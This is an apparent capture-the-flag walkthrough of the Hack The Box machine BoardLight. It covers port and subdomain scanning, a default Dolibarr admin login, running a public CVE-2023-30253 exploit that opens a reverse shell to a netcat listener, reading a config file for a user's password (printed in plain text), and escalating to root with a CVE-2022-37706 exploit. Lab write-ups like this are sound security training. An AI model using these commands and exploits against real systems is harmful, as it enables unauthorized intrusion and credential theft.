<img width="698" height="646" alt="image" src="https://github.com/user-attachments/assets/7aa146d2-5d02-467a-843a-a5631ae30bf4" />
# BoardLight HTB Walkthrough

> *How many TCP ports are listening on BoardLight?*
> 

start scanning using the command  `nmap -sV 10.129.160.129`

<img width="780" height="229" alt="image" src="https://github.com/user-attachments/assets/76ad77fc-caf9-4dfe-a381-27439f84aefa" />

**Findings:**

- Port 22: SSH
- Port 80: HTTP

Answer: **2**

> *What is the domain name used by the box?*
> 

at first i visit the ip address given and inspect the source code you can see what the domain name and you also can use whatweb command 

`whatweb 10.129.160.129`

<img width="982" height="102" alt="image" src="https://github.com/user-attachments/assets/287c98fc-1f2c-4df0-b789-32c1b8cd1ff2" />

<img width="1245" height="125" alt="image" src="https://github.com/user-attachments/assets/fb0ffad3-5aa2-49b4-a24d-91c3910a0d7d" />

Answer: **board.htb**

> *What is the name of the application running on a virtual host of board.htb?*
> 

first we need to find the hidden domain, we need to bruteforce it at first 

```php
ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
```

• Found a subdomain: `crm.board.htb`

then visit the page you will see the app running and the version 

<img width="1260" height="533" alt="image" src="https://github.com/user-attachments/assets/0db620cd-04c4-45cf-a117-ea7ee85d0d74" />

Answer: **Dolibarr**

> *What version of Dolibarr is running on BoardLight?*
> 

based on the previous page the version is 17.0.0

Answer: **17.0.0**

> *What is the default password for the admin user on Dolibarr?*
> 

you can search it from the internet or Search for terms like "Dolibarr default password"

<img width="976" height="353" alt="image" src="https://github.com/user-attachments/assets/72779d2d-7f4b-4b20-9e68-1a9462dff96c" />

Answer: **admin**

> *What is the 2023 CVE ID for an authenticated vulnerability that can lead to remote code execution in this version of Dolibarr?*
> 

You can Search for terms like "Dolibarr 17.0.0 cve”

<img width="688" height="647" alt="image" src="https://github.com/user-attachments/assets/dd548f44-a4ac-4fd9-a930-4c1360a05035" />

Answer: **CVE-2023-30253**

> *What user is the Dolibarr application running as on BoardLight?*
> 

I use `https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253` to exploit Dolibarr < = 17.0.0 

- Clone the repo:
    
    `git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
    cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253`
    
- Create a virtual environment:
    
    `python3 -m venv dolibarrenv
    source dolibarrenv/bin/activate`
    
- Install dependencies:
    
    `pip install -r requirements.txt`
    
- Start your Netcat listener:
    
    `nc -lvnp 4444`
    
- Run the exploit:
    
    `python3 exploit.py http://crm.board.htb admin admin 10.10.14.XX 4444`
    

<img width="1634" height="183" alt="image" src="https://github.com/user-attachments/assets/8bb1086c-2e33-473c-a903-a216d90e7e84" />

after connected to shell just run `whoami`

Answer: **www-data**

> *What is the full path of the file that contains the Dolibarr database connection information?*
> 

i run cat var/www/html/crm.board.htb/htdocs/conf/conf.php

<img width="730" height="604" alt="image" src="https://github.com/user-attachments/assets/8e0f0888-d2af-46dc-ac5d-9696395430b7" />

you can read all the database 

Answer: **var/www/html/crm.board.htb/htdocs/conf/conf.php**

> *Submit the flag located in the larissa user's home directory.*
> 

by the time we ran the previous command we already can see the larissa password

<img width="733" height="148" alt="image" src="https://github.com/user-attachments/assets/7408c0cb-3b98-4e22-8c2c-a774649cfa74" />

then I use the cred to login using ssh 

use password 

```php
serverfun2$2023!!
```

<img width="739" height="682" alt="image" src="https://github.com/user-attachments/assets/2d267bad-a4cb-45cf-8983-470e7d20afb6" />

then got the user flag!

> *What is the name of the desktop environment installed on Boardlight?*
> 

The version of **Enlightenment** installed on **BoardLight** is **0.23.1**.

we already uncovered this path during your SUID scan

<img width="719" height="344" alt="image" src="https://github.com/user-attachments/assets/6bd7f0c7-a0eb-4ab4-9532-d0eae9c83d2c" />

That directory name includes the version number:

> linux-gnu-x86_64-0.23.1
> 

This is a common convention in Enlightenment’s module structure, where the version is embedded in the path to match the installed desktop environment.

> *What version of Enlightenment is installed on BoardLight?*
> 

Answer **0.23.1**

> *What is the 2022 CVE ID for a vulnerability in Enlightenment versions before 0.25.4 that allows for privilege escalation?*
> 

Search for terms like "Enlightenment 0.23.1 cve".

<img width="755" height="638" alt="image" src="https://github.com/user-attachments/assets/e1f0a44e-93e2-4749-9abf-1808fff696ab" />

Answer: **CVE-2022-37706**

> *Submit the flag located in the root user's home directory.*
> 

https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit- I use this tool to get to root 

```php
scp exploit.sh larissa@10.129.160.129:/tmp
```

<img width="923" height="105" alt="image" src="https://github.com/user-attachments/assets/ee6213b0-a055-4a0c-9360-57752a3a04c6" />

**Execute the Exploit:**

<img width="760" height="413" alt="image" src="https://github.com/user-attachments/assets/70265fbc-429b-4bc5-89c1-64bb7f49d11a" />

then you get to root

<img width="763" height="55" alt="image" src="https://github.com/user-attachments/assets/60e21c9b-8db7-4e36-88b0-7d48d00db2b0" />

thats our flag!
